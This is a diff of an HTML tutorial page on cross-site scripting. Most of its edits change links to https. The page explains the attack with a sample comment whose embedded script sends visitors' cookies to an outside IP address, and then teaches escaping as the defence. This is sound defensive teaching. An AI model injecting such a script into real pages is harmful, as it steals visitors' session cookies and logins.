@@ -356,13 +356,13 @@
           <p>HTML also supports <span data-mb-component-type="tooltip" v-b-tooltip.hover.top.html="tooltipInnerContentGetter" class="trigger"><span data-mb-html-for="_content">In HTML, anything between the opening and closing script tags will run as <b>JavaScript</b>.
 </span><code>&lt;script&gt;</code></span>, for you to write <code>JavaScript</code> code on the webpage as well.</p>
           <p>What happens when a malicious user submits the following as a comment?</p>
-          <pre><code class="hljs html"><span>This is an innocent looking comment. <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">sendToServer(<span class="hljs-string">"http://139.241.0.3/"</span>, <span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre>
+          <pre><code class="hljs html"><span>This is an innocent looking comment. <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">sendToServer(<span class="hljs-string">"https://139.241.0.3/"</span>, <span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre>
           <p>It becomes:</p>
           <blockquote>
             <p><strong>Comments Section</strong> <br> That's a very nice picture! <br> Good photograph! <br> I <strong>like</strong> your photograph! <br> This is an innocent looking comment.</p>
           </blockquote>
           <p>Visitors of the blog will only see the non-script portion of the comment. The script portion is rendered as <code>Javascript</code> just like how the <code>&lt;b&gt;</code> and <code>&lt;i&gt;</code> tags causes text to be <strong>bolded</strong>            and <em>italicised</em> but the tags themselves are not shown.</p>
-          <p>The script <code>&lt;script&gt;sendToServer(&quot;http://139.241.0.3/&quot;, document.cookie)&lt;/script&gt;</code> will be run immediately when the visitors load the website. Here, the visitor will be unaware that his <span data-mb-component-type="tooltip"
+          <p>The script <code>&lt;script&gt;sendToServer(&quot;https://139.241.0.3/&quot;, document.cookie)&lt;/script&gt;</code> will be run immediately when the visitors load the website. Here, the visitor will be unaware that his <span data-mb-component-type="tooltip"
               v-b-tooltip.hover.top.html="tooltipInnerContentGetter" class="trigger"><span data-mb-html-for="_content">A cookie is a piece of data sent from the server and stored on the client's computer. It can contain sensitive information such as login data.</span>cookie</span>
             is stolen.</p>
           <p>Therefore, the malicious user has managed to add additional &quot;functionalities&quot; to the website that is not intended by the original website developer.</p>
@@ -409,7 +409,7 @@
               <p><strong>Escaping String Input</strong> <br> By converting legal HTML characters to their display-equivalent (e.g. <code>&lt;</code> to <code>&amp;lt;</code>), you prevent the symbol from being parsed as HTML. It now even shows the content
                 on the screen (in case the actual intention is to actually show someone how to code for example). In the above example, the comment section will become like this:</p>
               <blockquote>
-                <p><strong>Comments Section</strong> <br> That's a very nice picture! <br> Good photograph! <br> I <strong>like</strong> your photograph! <br> This is an innocent looking comment. <code>&lt;script&gt;sendToServer(&quot;http://139.241.0.3/&quot;, document.cookie)&lt;/script&gt;</code></p>
+                <p><strong>Comments Section</strong> <br> That's a very nice picture! <br> Good photograph! <br> I <strong>like</strong> your photograph! <br> This is an innocent looking comment. <code>&lt;script&gt;sendToServer(&quot;https://139.241.0.3/&quot;, document.cookie)&lt;/script&gt;</code></p>
               </blockquote>
               <p>The <code>&lt;script&gt;</code> and <code>&lt;/script&gt;</code> will be displayed as text rather than being run as <code>JavaScript</code> by the browser.</p>
             </li>
@@ -427,7 +427,7 @@
           <p>You can also consider using XSS scanning tools to check whether your web application is vulnerable. Below are links of some open-source XSS scanning tools:</p>
           <ol>
             <li><a href="http://wapiti.sourceforge.net/">http://wapiti.sourceforge.net/</a> (Web Application Vulnerability Scanner)</li>
-            <li><a href="http://w3af.org/">http://w3af.org/</a> (Web Application Attack and Audit Framework)</li>
+            <li><a href="https://w3af.org/">https://w3af.org/</a> (Web Application Attack and Audit Framework)</li>
             <li><a href="https://www.arachni-scanner.com/">https://www.arachni-scanner.com/</a> (Web Application Security Scanner Framework)</li>
           </ol>
           <h2 id="where-to-go-from-here">Where to Go From Here?<a class="fa fa-anchor" href="#where-to-go-from-here"></a></h2>
@@ -441,7 +441,7 @@
             <li><a href="http://projects.webappsec.org/f/WASC-TC-v2_0.pdf">http://projects.webappsec.org/f/WASC-TC-v2_0.pdf</a> (page 32 &amp; 33) (Basic description of the XSS attack taken from here)</li>
             <li><a href="https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29#Stored_and_Reflected_XSS_Attacks">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)#Stored_and_Reflected_XSS_Attacks</a> (Description of the two types of XSS
               attack taken from here)</li>
-            <li><a href="http://blog.jeremiahgrossman.com/2006/07/origins-of-cross-site-scripting-xss.html">http://blog.jeremiahgrossman.com/2006/07/origins-of-cross-site-scripting-xss.html</a> (Origin of the name &quot;Cross Site Scripting&quot;)</li>
+            <li><a href="https://blog.jeremiahgrossman.com/2006/07/origins-of-cross-site-scripting-xss.html">https://blog.jeremiahgrossman.com/2006/07/origins-of-cross-site-scripting-xss.html</a> (Origin of the name &quot;Cross Site Scripting&quot;)</li>
             <li><a href="https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Web-application-attacks-2018-eng.pdf">https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Web-application-attacks-2018-eng.pdf</a> (Statistical Summary taken from
               here)</li>
           </ol>
@@ -450,7 +450,7 @@
             <li><a href="https://www.owasp.org/index.php/Testing_for_Cross_site_scripting">https://www.owasp.org/index.php/Testing_for_Cross_site_scripting</a> (How to manually test your own website for XSS attacks?)</li>
             <li><a href="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet">https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</a> (A list of possible preventions, which contains even more
               ways to protect your site from XSS attacks).</li>
-            <li><a href="http://guides.rubyonrails.org/security.html#cross-site-scripting-xss">http://guides.rubyonrails.org/security.html#cross-site-scripting-xss</a> (In-depth discussion of how XSS attacks work, the different possible scenarios of such
+            <li><a href="https://guides.rubyonrails.org/security.html#cross-site-scripting-xss">https://guides.rubyonrails.org/security.html#cross-site-scripting-xss</a> (In-depth discussion of how XSS attacks work, the different possible scenarios of such
               attacks, and possible preventive measures)</li>
             <li><a href="https://www.owasp.org/index.php/DOM_Based_XSS">https://www.owasp.org/index.php/DOM_Based_XSS</a> (Discussion about DOM-based XSS attacks, a third possible type of XSS attacks)</li>
             <li><a href="https://excess-xss.com/">https://excess-xss.com/</a> (Comprehensive coverage of <em>all</em> aspects of XSS)</li>
@@ -479,7 +479,7 @@
     </div>
     <footer>
       <div class="text-center">
-        <small>[Generated by <a href="https://markbind.org/">MarkBind 2.13.1</a> on Sun, Apr 12, 2020, 4:41:42 AM UTC]</small></div>
+        <small>[Generated by <a href="https://markbind.org/">MarkBind 2.13.1</a> on Mon, Apr 13, 2020, 5:35:54 PM UTC]</small></div>
     </footer>
   </div>
 </body>
